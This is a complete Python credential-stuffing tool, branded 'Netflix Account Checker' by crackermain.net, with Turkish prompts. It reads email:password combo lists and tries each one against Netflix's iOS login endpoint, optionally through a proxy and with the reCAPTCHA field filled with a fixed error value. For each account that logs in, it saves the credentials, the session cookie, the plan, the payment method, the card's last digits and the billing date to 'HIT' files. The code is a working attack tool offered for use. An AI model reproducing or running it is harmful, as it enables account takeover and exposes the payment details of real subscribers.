import subprocess
import sys

# Gerekli kütüphaneleri otomatik kur
def install_requirements():
    required = {
        'requests': 'requests',
        'colorama': 'colorama'
    }
    
    print("Gerekli kütüphaneler kontrol ediliyor...")
    
    for module, package in required.items():
        try:
            __import__(module)
        except ImportError:
            print(f"'{package}' kuruluyor...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q"])
            print(f"✓ '{package}' kuruldu")
    
    print("✓ Tüm kütüphaneler hazır!\n")

install_requirements()

import requests
import re
import urllib.parse
from typing import Dict, Optional
import time
import json
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)

class NetflixChecker:
    def __init__(self, debug=True, proxy=None):
        self.session = requests.Session()
        self.cookies = {}
        self.debug = debug
        self.variables = {}
        self.proxy_url = proxy
        
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
            self.log(f"Proxy: {proxy}", "INFO")
        
    def log(self, message: str, level: str = "INFO"):
        if not self.debug:
            return
        colors = {"INFO": Fore.CYAN, "SUCCESS": Fore.GREEN, "ERROR": Fore.RED, "WARNING": Fore.YELLOW, "DEBUG": Fore.MAGENTA}
        color = colors.get(level, Fore.WHITE)
        print(f"{color}[{level}] {message}{Style.RESET_ALL}")
        
    def check_account(self, email: str, password: str) -> Dict:
        # Session sıfırla
        self.session = requests.Session()
        self.cookies = {}
        self.variables = {}
        
        if self.proxy_url:
            self.session.proxies = {'http': self.proxy_url, 'https': self.proxy_url}
        
        self.log(f"Kontrol: {email}", "INFO")
        
        result = {'status': 'unknown', 'email': email, 'password': password, 'cookies': None, 'plan_info': {}}
        
        try:
            # STEP 1: Signup
            self.log("STEP 1: Signup...", "DEBUG")
            signup_response = self._request_signup()
            if not signup_response:
                result['status'] = 'error'
                result['error'] = 'Signup hatası'
                return result
            
            # STEP 2: Parse
            self.log("STEP 2: Parse...", "DEBUG")
            
            if 'flwssn' in self.session.cookies:
                self.variables['flwssn'] = self.session.cookies['flwssn']
            if 'SecureNetflixId' in self.session.cookies:
                self.variables['SecureNetflixId'] = self.session.cookies['SecureNetflixId']
            if 'NetflixId' in self.session.cookies:
                self.variables['NetflixId'] = self.session.cookies['NetflixId']
            
            auth_match = re.search(r'"authURL":"([^"]+)"', signup_response.text)
            if auth_match:
                self.variables['AUTH'] = auth_match.group(1)
                self.variables['AUTH1'] = self.variables['AUTH'].encode().decode('unicode_escape')
                self.variables['AUTH_URL'] = urllib.parse.quote(self.variables['AUTH1'], safe='')
            else:
                self.variables['AUTH'] = ''
                self.variables['AUTH1'] = ''
                self.variables['AUTH_URL'] = ''
            
            locale_match = re.search(r'"locale":"([^"]+)"', signup_response.text)
            if locale_match:
                self.variables['L'] = locale_match.group(1)
            
            esn_match = re.search(r'"esn":"([^"]+)"', signup_response.text)
            self.variables['ESN'] = esn_match.group(1) if esn_match else 'NFCDSF-PH-DEFAULT'
            
            x_match = re.search(r'"X-Netflix\.esnPrefix":"([^"]+)"', signup_response.text)
            if x_match:
                self.variables['X'] = x_match.group(1)
            
            country_match = re.search(r'"country":"([^"]+)"', signup_response.text)
            if country_match:
                self.variables['C'] = country_match.group(1)
            
            # STEP 3: Login
            self.log("STEP 3: Login...", "DEBUG")
            login_response = self._request_login(email, password)
            if not login_response:
                result['status'] = 'error'
                result['error'] = 'Login hatası'
                return result
            
            # STEP 4: Status
            status_match = re.search(r'"membershipStatus":"([^"]+)"', login_response.text)
            self.variables['Status'] = status_match.group(1) if status_match else 'UNKNOWN'
            
            # STEP 5: KEYCHECK
            self.log("STEP 5: KEYCHECK...", "DEBUG")
            
            is_success = ('"mode":"memberHome' in login_response.text and 
                         self.variables.get('Status') == 'CURRENT_MEMBER')
            
            is_failure = ('"mode":"login' in login_response.text or
                         self.variables.get('Status') in ['ANONYMOUS', 'NEVER_MEMBER', 'FORMER_MEMBER'])
            
            if is_success:
                result['status'] = 'success'
                self.log("✓ SUCCESS", "SUCCESS")
                
                if 'NetflixId' in self.session.cookies:
                    result['cookies'] = self.session.cookies['NetflixId']
                
                # STEP 6: Account info
                self.log("STEP 6: Account info...", "DEBUG")
                account_info = self._get_account_info()
                if account_info:
                    result['plan_info'] = account_info
                    
            elif is_failure:
                result['status'] = 'failure'
                result['error'] = 'Yanlış email/şifre'
                self.log("✗ FAILURE", "WARNING")
            else:
                result['status'] = 'error'
                result['error'] = f"Belirsiz - Status: {self.variables.get('Status', 'N/A')}"
                
        except Exception as e:
            result['status'] = 'error'
            result['error'] = str(e)
            self.log(f"Hata: {str(e)}", "ERROR")
            
        return result
    
    def _request_signup(self) -> Optional[requests.Response]:
        headers = {
            'Host': 'www.netflix.com',
            'X-Netflix.osName': 'iOS',
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1',
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8'
        }
        
        try:
            response = self.session.get('https://www.netflix.com/signup', headers=headers)
            return response
        except:
            return None
    
    def _request_login(self, email: str, password: str) -> Optional[requests.Response]:
        headers = {
            'Host': 'ios.prod.ftl.netflix.com',
            'User-Agent': 'Argo/17.28.1 (iPhone; iOS 18.3.2; Scale/3.00)',
            'Accept': '*/*',
            'Content-Type': 'application/json',
            'Connection': 'keep-alive'
        }
        
        param_dict = {
            "action": "loginAction",
            "fields": {
                "nextPage": "", "rememberMe": "true", "countryCode": "", "countryIsoCode": "",
                "userLoginId": email, "password": password, "recaptchaResponseToken": "",
                "recaptchaError": "LOAD_TIMED_OUT", "previousMode": ""
            }
        }
        
        param_json = json.dumps(param_dict)
        param_encoded = urllib.parse.quote(param_json)
        esn_value = self.variables.get('ESN', '')
        auth_url_value = self.variables.get('AUTH_URL', '')
        
        content = f"param={param_encoded}&esn={esn_value}&authURL={auth_url_value}"
        
        url = 'https://ios.prod.ftl.netflix.com/api/aui/pathEvaluator/web/%5E2.0.0'
        params = {
            'landingURL': '/ma-en/login', 'landingOrigin': 'https://www.netflix.com',
            'inapp': 'false', 'languages': 'en-MA', 'netflixClientPlatform': 'browser',
            'flow': 'websiteSignUp', 'mode': 'login', 'method': 'call',
            'falcor_server': '0.1.0', 'callPath': '["aui","moneyball","next"]'
        }
        
        try:
            response = self.session.post(url, params=params, data=content, headers=headers)
            return response
        except:
            return None
    
    def _get_account_info(self) -> Optional[Dict]:
        headers = {
            'Host': 'www.netflix.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Connection': 'keep-alive',
            'Referer': 'https://www.netflix.com/'
        }
        
        try:
            redirect_response = self.session.get('https://www.netflix.com/browse', headers=headers, allow_redirects=True)
            
            headers['Referer'] = 'https://www.netflix.com/browse'
            account_response = self.session.get('https://www.netflix.com/account', headers=headers)
            
            if account_response.status_code != 200:
                return None
            
            text = account_response.text
            info = {}
            
            patterns = {
                'PlanName': r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"',
                'videoQuality': r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"',
                'maxStreams': r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}',
                'planPrice': r'"planPrice":\{"fieldType":"String","value":"([^"]+)"',
                'paymentMethod': r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}',
                'paymentType': r'"paymentOptionLogo":"([^"]+)"\}\}]',
                'LastDigit': r'"displayText":\{"fieldType":"String","value":"([^"]+)"\}\}\}]',
                'Expiry': r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}',
                'ExtraMember': r'"showExtraMemberSection":\{"fieldType":"Boolean","value":(true|false)\}'
            }
            
            for key, pattern in patterns.items():
                match = re.search(pattern, text)
                if match:
                    value = match.group(1)
                    if key == 'planPrice':
                        value = value.encode().decode('unicode_escape')
                    elif key == 'Expiry':
                        value = value.replace('\\x20', ' ')
                    info[key] = value
            
            return info if info else None
        except:
            return None


def read_combo_file(filename: str):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        
        combos = []
        for line in lines:
            line = line.strip()
            if ':' in line:
                parts = line.split(':', 1)
                if len(parts) == 2:
                    combos.append((parts[0].strip(), parts[1].strip()))
        return combos
    except:
        return []


def save_result(result: Dict):
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        if result['status'] == 'success':
            with open('crackermain.net - Netflix_HIT.txt', 'a', encoding='utf-8') as f:
                f.write(f"\n{'='*70}\n")
                f.write(f"[{timestamp}] ✓ HIT - crackermain.net\n")
                f.write(f"{'='*70}\n")
                f.write(f"Email: {result['email']}\n")
                f.write(f"Password: {result['password']}\n")
                f.write(f"\nCookie: {result['cookies']}\n")
                
                if result['plan_info']:
                    f.write(f"\n{'─'*70}\n")
                    f.write(f"PLAN BİLGİLERİ:\n")
                    f.write(f"{'─'*70}\n")
                    for key, value in result['plan_info'].items():
                        f.write(f"  • {key}: {value}\n")
                f.write(f"{'='*70}\n\n")
            
            with open('crackermain.net - Netflix_Simple.txt', 'a', encoding='utf-8') as f:
                f.write(f"{result['email']}:{result['password']}\n")
                
        elif result['status'] == 'failure':
            with open('crackermain.net - Netflix_BAD.txt', 'a', encoding='utf-8') as f:
                f.write(f"[{timestamp}] {result['email']}:{result['password']}\n")
        else:
            with open('crackermain.net - Netflix_ERROR.txt', 'a', encoding='utf-8') as f:
                f.write(f"[{timestamp}] {result['email']} - {result.get('error', 'Unknown')}\n")
    except:
        pass


def print_banner():
    banner = f"""
{Fore.CYAN}{'='*70}
    _   _      _    __ _ _        ____ _               _             
   | \ | | ___| |_ / _| (_)_  __ / ___| |__   ___  ___| | _____ _ __ 
   |  \| |/ _ \ __| |_| | \ \/ /| |   | '_ \ / _ \/ __| |/ / _ \ '__|
   | |\  |  __/ |_|  _| | |>  < | |___| | | |  __/ (__|   <  __/ |   
   |_| \_|\___|\__|_| |_|_/_/\_\ \____|_| |_|\___|\___|_|\_\___|_|   
                                                                       
              Netflix Account Checker - crackermain.net
                    Designed by @ytr3so | v2.0
{'='*70}{Style.RESET_ALL}
"""
    print(banner)


def main():
    print_banner()
    
    combo_file = input(f"{Fore.YELLOW}Combo dosya yolu: {Style.RESET_ALL}").strip()
    if not combo_file:
        combo_file = "combos.txt"
    
    combos = read_combo_file(combo_file)
    
    if not combos:
        print(f"{Fore.RED}Combo dosyası bulunamadı veya boş!{Style.RESET_ALL}")
        return
    
    print(f"{Fore.GREEN}✓ {len(combos)} combo yüklendi{Style.RESET_ALL}\n")
    
    debug_mode = input(f"{Fore.YELLOW}Debug modu? (y/n): {Style.RESET_ALL}").strip().lower()
    debug = debug_mode == 'y'
    
    use_proxy = input(f"{Fore.YELLOW}Proxy kullan? (y/n): {Style.RESET_ALL}").strip().lower()
    proxy = None
    if use_proxy == 'y':
        proxy = input(f"{Fore.YELLOW}Proxy: {Style.RESET_ALL}").strip()
    
    delay_input = input(f"{Fore.YELLOW}Delay (saniye, default: 2): {Style.RESET_ALL}").strip()
    delay = float(delay_input) if delay_input else 2.0
    
    checker = NetflixChecker(debug=debug, proxy=proxy)
    
    stats = {'success': 0, 'failure': 0, 'error': 0}
    start_time = time.time()
    
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f"Başlıyor... | crackermain.net")
    print(f"{'='*70}{Style.RESET_ALL}\n")
    
    for idx, (email, password) in enumerate(combos, 1):
        print(f"\n{Fore.MAGENTA}[{idx}/{len(combos)}] {email}{Style.RESET_ALL}")
        
        result = checker.check_account(email, password)
        
        if result['status'] == 'success':
            stats['success'] += 1
            print(f"{Fore.GREEN}✓ HIT! {email}:{password}{Style.RESET_ALL}")
            if result['plan_info']:
                for key, value in result['plan_info'].items():
                    print(f"{Fore.GREEN}  • {key}: {value}{Style.RESET_ALL}")
            save_result(result)
            
        elif result['status'] == 'failure':
            stats['failure'] += 1
            print(f"{Fore.RED}✗ BAD{Style.RESET_ALL}")
            save_result(result)
            
        else:
            stats['error'] += 1
            print(f"{Fore.YELLOW}⚠ ERROR: {result.get('error', 'Unknown')}{Style.RESET_ALL}")
            save_result(result)
        
        if idx < len(combos):
            time.sleep(delay)
    
    elapsed = time.time() - start_time
    
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f"ÖZET - crackermain.net")
    print(f"{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}✓ HIT: {stats['success']}{Style.RESET_ALL}")
    print(f"{Fore.RED}✗ BAD: {stats['failure']}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}⚠ ERROR: {stats['error']}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Süre: {elapsed:.2f}s | Ort: {elapsed/len(combos):.2f}s/hesap{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    
    if stats['success'] > 0:
        print(f"\n{Fore.GREEN}✓ HIT dosyaları:")
        print(f"  • crackermain.net - Netflix_HIT.txt")
        print(f"  • crackermain.net - Netflix_Simple.txt{Style.RESET_ALL}")
    
    print(f"\n{Fore.CYAN}Design by @ytr3so | crackermain.net{Style.RESET_ALL}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Durduruldu!{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}Hata: {str(e)}{Style.RESET_ALL}")